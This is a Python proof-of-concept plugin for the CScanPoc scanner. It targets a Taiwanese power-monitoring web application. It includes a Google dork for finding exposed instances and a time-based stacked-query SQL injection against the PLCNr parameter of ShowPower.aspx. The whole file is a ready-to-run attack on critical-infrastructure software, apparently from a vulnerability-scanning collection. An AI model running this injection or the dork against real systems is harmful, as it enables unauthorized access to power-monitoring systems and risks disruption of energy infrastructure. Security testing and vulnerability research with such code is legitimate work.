# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urlparse
import time

class Vuln(ABVuln):
    vuln_id = 'Electric_Monitor_0002'  # 平台漏洞编号，留空
    name = '台湾某电力监控系统通用型注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-03-23'  # 漏洞公布时间
    desc = '''
        台湾某电力监控系统通用型注入漏洞。
        google dork:"智慧型電能監控管理系統"
        http://foorbar/ShowPower.aspx?Pic=2&PLCNr=1 Parameter: PLCNr (GET)
        type: stack queries, AND/OR time-baseed blind, boolean-based blind
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '电力监控系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '99ecc217-779c-47e9-83bb-1ef73178f9f7'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2010-0102608
            hh = hackhttp.hackhttp()
            arg = self.target
            waitfor_0 = arg + '/ShowPower.aspx?Pic=2&PLCNr=1;waitfor%20delay%20%270:0:0%27--'
            waitfor_5 = arg + '/ShowPower.aspx?Pic=2&PLCNr=1;waitfor%20delay%20%270:0:5%27--'
            code, head, res, err, _ = hh.http(arg)
            t1 = time.time()
            code1, head, res, err, _ = hh.http(waitfor_0)
            if code == 0:
                return False
            t2 = time.time()
            code2, head, res, err, _ = hh.http(waitfor_5)
            if code == 0:
                return False
            t3 = time.time()
            if code1 == 500 and code2 == 500 and t2-t1 < 2 and t3-t2 > 5:
                #security_hole('SQL injection: ' + waitfor_5)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
